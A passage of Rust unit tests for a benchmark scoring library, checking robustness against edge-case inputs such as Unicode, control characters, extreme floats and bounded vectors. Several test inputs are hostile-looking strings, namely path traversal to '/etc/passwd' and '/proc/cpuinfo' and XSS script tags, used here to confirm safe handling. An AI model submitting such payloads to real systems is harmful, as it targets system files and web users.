            "scenario\nwith\nnewlines",                               // Multiline
            "🚀emoji_scenario🔥",                                     // Unicode emoji
            "\u{FFFF}max_unicode",                                    // Max BMP character
            "very_".to_string() + &"long_".repeat(1000) + "scenario", // Very long name
            "../../../etc/passwd",                                    // Path traversal
            "<script>alert('xss')</script>",                          // XSS attempt
            "{\"json\": \"injection\"}",                              // JSON injection
        ];

        for name in problematic_names {
            let result = default_scoring(&name);
            // Should return None for unknown scenarios without panicking
            assert!(
                result.is_none(),
                "Should return None for unknown scenario: {}",
                name
            );
        }

        // Verify that known scenarios still work correctly
        assert!(default_scoring("cold_start_latency").is_some());
        assert!(default_scoring("p99_request_latency").is_some());
    }

    #[test]
    fn negative_push_bounded_with_extreme_capacity_and_overflow_scenarios() {
        // Test push_bounded with zero capacity
        let mut items = vec![1, 2, 3];
        push_bounded(&mut items, 4, 0);
        assert_eq!(items, vec![4], "Zero capacity should keep only new item");

        // Test with capacity 1
        push_bounded(&mut items, 5, 1);
        assert_eq!(items, vec![5], "Capacity 1 should keep only new item");

        // Test with massive overflow
        let mut large_vec: Vec<u32> = (0..10000).collect();
        let original_len = large_vec.len();
        push_bounded(&mut large_vec, 99999, 3);
        assert_eq!(large_vec.len(), 3);
        assert_eq!(*large_vec.last().unwrap(), 99999);

        // Test capacity larger than current size
        let mut small_vec = vec![10, 20];
        push_bounded(&mut small_vec, 30, 100);
        assert_eq!(
            small_vec,
            vec![10, 20, 30],
            "Should not drain when under capacity"
        );

        // Test edge case: capacity equals current size
        let mut exact_vec = vec![1, 2, 3];
        push_bounded(&mut exact_vec, 4, 3);
        assert_eq!(exact_vec.len(), 3);
        assert!(exact_vec.contains(&4), "Should contain new item");
    }

    #[test]
    fn negative_hardware_profile_with_unicode_and_control_characters() {
        // Test HardwareProfile with problematic hardware descriptions
        let problematic_profiles = vec![
            HardwareProfile {
                cpu: "\0Intel\x01Core\x7fi7".to_string(),
                memory_gb: 32,
                disk_type: "control\nchars".to_string(),
            },
            HardwareProfile {
                cpu: "🚀Quantum🔥Processor💀".to_string(),
                memory_gb: 128,
                disk_type: "\u{FFFF}\u{10FFFF}".to_string(),
            },
            HardwareProfile {
                cpu: "".to_string(),          // Empty CPU
                memory_gb: 0,                 // Zero memory
                disk_type: "   ".to_string(), // Whitespace disk type
            },
            HardwareProfile {
                cpu: "../../../proc/cpuinfo".to_string(), // Path traversal
                memory_gb: u32::MAX,                      // Maximum memory
                disk_type: "<script>alert('hardware')</script>".to_string(), // XSS
            },
        ];

        for profile in problematic_profiles {
            // Serialization should handle problematic data without panicking
            let serialized = serde_json::to_string(&profile);
            assert!(serialized.is_ok(), "Serialization should not panic");

            if let Ok(json) = serialized {
                // Deserialization should round-trip correctly
                let deserialized: Result<HardwareProfile, _> = serde_json::from_str(&json);
                match deserialized {
                    Ok(restored) => {
                        assert_eq!(restored.cpu, profile.cpu);
                        assert_eq!(restored.memory_gb, profile.memory_gb);
                        assert_eq!(restored.disk_type, profile.disk_type);
                    }
                    Err(_) => {
                        // Some characters might not survive JSON round-trip, which is acceptable
                    }
                }
            }
        }
    }

    #[test]
    fn negative_scoring_config_score_computation_with_extreme_floating_point_values() {
        // Test scoring with various floating point edge cases
        let config = ScoringConfig::lower_is_better(100.0, 200.0);

        let extreme_values = vec![
            (f64::EPSILON, "epsilon"),
            (f64::MIN, "minimum finite"),
            (f64::MAX, "maximum finite"),
            (f64::MIN_POSITIVE, "minimum positive"),
            (1e-308, "very small"),
            (1e308, "very large"),
            (-0.0, "negative zero"),
            (0.0, "positive zero"),
        ];

        for (value, description) in extreme_values {
            let score = config.score(value);
            assert!(
                score <= 100,
                "Score should be bounded [0,100] for {}: {} -> {}",
                description,
                value,
                score
            );

            // Score computation should not panic or produce invalid results
            assert!(!score.to_string().contains("NaN"));
            assert!(!score.to_string().contains("inf"));
        }

        // Test with values that could cause overflow in intermediate calculations
        let overflow_config = ScoringConfig {
            ideal: 1e100,
            threshold: 1e200,
            lower_is_better: true,
        };

        let overflow_score = overflow_config.score(1.5e150);
        assert!(overflow_score <= 100, "Overflow case should be bounded");
    }

    #[test]
    fn negative_benchmark_dimension_display_and_ordering_consistency() {
        // Test that Display implementation is consistent with serialization
        for dimension in BenchmarkDimension::all() {
            let display_str = format!("{}", dimension);
            let serde_str = serde_json::to_string(dimension).unwrap();
            let serde_unquoted = serde_str.trim_matches('"');

            assert_eq!(
                display_str, serde_unquoted,
                "Display and serde representation should match for {:?}",
                dimension
            );

            // Display string should be valid identifier-like
            assert!(!display_str.is_empty());
            assert!(!display_str.contains(' '));
            assert!(
                display_str
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c == '_')
            );
        }

        // Test ordering consistency
        let mut dimensions = BenchmarkDimension::all().to_vec();
        dimensions.sort();

        // Should maintain consistent ordering
        for i in 1..dimensions.len() {
            assert!(
                dimensions[i - 1] <= dimensions[i],
                "Ordering should be consistent: {:?} <= {:?}",
                dimensions[i - 1],
                dimensions[i]
            );
        }

        // Test that all() returns all expected dimensions
        assert_eq!(dimensions.len(), 6, "Should have exactly 6 dimensions");

        // Verify no duplicates
        let mut unique_set = BTreeSet::new();
        for dimension in BenchmarkDimension::all() {
            assert!(unique_set.insert(*dimension), "Dimensions should be unique");
        }
    }

    #[test]
    fn negative_scoring_formula_constants_validation() {
        // Test that scoring formula constants are well-formed
        assert!(!SCORING_FORMULA_VERSION.is_empty());
        assert!(!SUITE_VERSION.is_empty());

        assert!(SCORING_FORMULA_VERSION.starts_with("sf-"));
        assert!(SUITE_VERSION.chars().any(|c| c.is_ascii_digit()));

        // Test variance and regression thresholds are reasonable
        assert!(MAX_VARIANCE_PCT > 0.0 && MAX_VARIANCE_PCT < 100.0);
        assert!(DEFAULT_REGRESSION_THRESHOLD_PCT > 0.0);
        assert!(DETERMINISTIC_JITTER_RATIO > 0.0 && DETERMINISTIC_JITTER_RATIO < 1.0);

        // Test that constants are finite numbers
        assert!(MAX_VARIANCE_PCT.is_finite());
        assert!(DEFAULT_REGRESSION_THRESHOLD_PCT.is_finite());
        assert!(DETERMINISTIC_JITTER_RATIO.is_finite());

        // Test MAX_SCENARIOS bound
        assert!(MAX_SCENARIOS > 0);
        assert!(
            MAX_SCENARIOS <= 1_000_000,
            "Should have reasonable upper bound"
        );
    }
}
